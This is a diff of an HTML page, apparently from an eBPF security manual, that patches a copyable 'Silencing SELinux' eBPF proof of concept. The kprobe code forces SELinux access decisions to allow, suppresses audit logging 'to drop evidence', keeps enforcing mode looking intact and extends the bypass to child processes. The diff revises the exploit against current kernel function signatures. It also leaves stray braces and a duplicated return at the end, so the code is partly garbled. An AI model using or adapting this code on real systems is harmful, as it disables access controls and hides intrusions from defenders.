@@ -53,6 +53,13 @@
                 
                     
                     
+                    <a href="/dBPF/chapter-0-field-manual-preface.html" >
+                        Chapter 0: Field Manual Preface
+                    </a>
+                    
+                
+                    
+                    
                     <a href="/dBPF/the-mirror-controls.html" >
                         The Mirror Controls
                     </a>
@@ -681,6 +688,30 @@ graph TD
 295
 296
 297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
 </pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
 <span class="c1">// @copyable: true</span>
 <span class="c1">// Silencing SELinux - eBPF exploitation proof of concept</span>
@@ -828,10 +859,23 @@ graph TD
         <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
     
     <span class="c1">// Check the command name</span>
-<span class="c1">// Hook the SELinux AVC check function</span>
+    <span class="kt">char</span> <span class="n">comm</span><span class="p">[</span><span class="n">MAX_COMM_LEN</span><span class="p">];</span>
+    <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">comm</span><span class="p">));</span>
+    
+    <span class="k">return</span> <span class="n">should_bypass_command</span><span class="p">(</span><span class="n">comm</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Generate a unique ID for a SELinux event</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">u64</span> <span class="nf">generate_event_id</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u64</span> <span class="n">ts</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">ts</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">pid</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// FIXED: Hook the SELinux AVC check function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/avc_has_perm_noaudit"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_avc_check</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ssid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">tsid</span><span class="p">,</span> <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span>
-               <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_avc_check</span><span class="p">,</span> <span class="k">struct</span> <span class="n">selinux_state</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="n">u32</span> <span class="n">ssid</span><span class="p">,</span> <span class="n">u32</span> <span class="n">tsid</span><span class="p">,</span>
+               <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span> <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
@@ -846,11 +890,11 @@ graph TD
         <span class="n">event</span><span class="p">.</span><span class="n">tclass</span> <span class="o">=</span> <span class="n">tclass</span><span class="p">;</span>
         <span class="n">event</span><span class="p">.</span><span class="n">requested</span> <span class="o">=</span> <span class="n">requested</span><span class="p">;</span>
         
-        <span class="c1">// Read the original decision</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">allowed</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">allowed</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">allowed</span><span class="p">);</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">denied</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">denied</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">denied</span><span class="p">);</span>
+        <span class="c1">// FIXED: Read the original decision</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">allowed</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">allowed</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">allowed</span><span class="p">);</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">denied</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">denied</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">denied</span><span class="p">);</span>
         
-        <span class="c1">// Modify the decision to allow access</span>
+        <span class="c1">// FIXED: Modify the decision to allow access</span>
         <span class="c1">// Set all requested permissions as allowed</span>
         <span class="n">u32</span> <span class="n">new_allowed</span> <span class="o">=</span> <span class="n">event</span><span class="p">.</span><span class="n">allowed</span> <span class="o">|</span> <span class="n">requested</span><span class="p">;</span>
         <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">allowed</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">new_allowed</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
@@ -859,9 +903,9 @@ graph TD
         <span class="n">u32</span> <span class="n">zero</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
         <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">denied</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
         
-        <span class="c1">// Mark as a cache hit to prevent further checks</span>
+        <span class="c1">// FIXED: Mark as a cache hit to prevent further checks</span>
         <span class="n">u8</span> <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flags</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flags</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flags</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flags</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>
         <span class="n">flags</span> <span class="o">|=</span> <span class="mh">0x01</span><span class="p">;</span>  <span class="c1">// AVC_CACHED flag</span>
         <span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">avd</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flags</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u8</span><span class="p">));</span>
         
@@ -881,10 +925,10 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the SELinux policy lookup function</span>
+<span class="c1">// FIXED: Hook the SELinux policy lookup function</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/security_compute_av"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_compute_av</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ssid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">tsid</span><span class="p">,</span> <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span>
-               <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_compute_av</span><span class="p">,</span> <span class="k">struct</span> <span class="n">selinux_state</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="n">u32</span> <span class="n">ssid</span><span class="p">,</span> <span class="n">u32</span> <span class="n">tsid</span><span class="p">,</span>
+               <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span> <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Get process information</span>
     <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
@@ -930,10 +974,10 @@ graph TD
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the audit logging function to drop evidence</span>
+<span class="c1">// FIXED: Hook the audit logging function to drop evidence</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/avc_audit"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_avc_audit</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ssid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">tsid</span><span class="p">,</span> <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span>
-               <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">,</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_avc_audit</span><span class="p">,</span> <span class="k">struct</span> <span class="n">selinux_state</span> <span class="o">*</span><span class="n">state</span><span class="p">,</span> <span class="n">u32</span> <span class="n">ssid</span><span class="p">,</span> <span class="n">u32</span> <span class="n">tsid</span><span class="p">,</span>
+               <span class="n">u16</span> <span class="n">tclass</span><span class="p">,</span> <span class="n">u32</span> <span class="n">requested</span><span class="p">,</span> <span class="k">struct</span> <span class="n">av_decision</span> <span class="o">*</span><span class="n">avd</span><span class="p">,</span>
                <span class="kt">int</span> <span class="n">result</span><span class="p">,</span> <span class="k">struct</span> <span class="n">common_audit_data</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Get process information</span>
@@ -952,32 +996,43 @@ graph TD
 
 <span class="c1">// Ensure SELinux still appears to be enforcing</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/selinux_enforcing_enabled"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_selinux_status</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_selinux_status</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="c1">// Always return 1 (enforcing) to maintain appearances</span>
     <span class="c1">// This is a simplified approach - a real exploit would be more sophisticated</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>  <span class="c1">// Let the original function run</span>
 <span class="p">}</span>
 
-<span class="c1">// Add child processes to our tracking map</span>
+<span class="c1">// FIXED: Add child processes to our tracking map</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/wake_up_new_task"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="n">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_new_task</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_new_task</span><span class="p">,</span> <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">)</span>
 <span class="p">{</span>
-    <span class="n">u32</span> <span class="n">parent_pid</span><span class="p">;</span>
-    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="p">);</span>
     
-    <span class="c1">// If parent is in our target list, add the child too</span>
-    <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">target</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">u32</span> <span class="n">child_pid</span><span class="p">;</span>
-        <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">parent</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">pid_t</span> <span class="n">parent_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">parent_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">parent_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
         
-        <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="c1">// If parent is in our target list, add the child too</span>
+        <span class="n">u32</span> <span class="n">parent_pid_u32</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">parent_pid</span><span class="p">;</span>
+        <span class="n">u8</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parent_pid_u32</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">target</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">target</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">pid_t</span> <span class="n">child_pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="n">bpf_probe_read_kernel</span><span class="p">(</span><span class="o">&amp;</span><span class="n">child_pid</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">child_pid</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">task</span><span class="o">-&gt;</span><span class="n">tgid</span><span class="p">);</span>
+            
+            <span class="n">u8</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="n">u32</span> <span class="n">child_pid_u32</span> <span class="o">=</span> <span class="p">(</span><span class="n">u32</span><span class="p">)</span><span class="n">child_pid</span><span class="p">;</span>
+            <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_processes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">child_pid_u32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        <span class="p">}</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
+    <span class="err">}</span>
+    
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="err">}</span>
 </pre></td></tr></tbody></table></code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
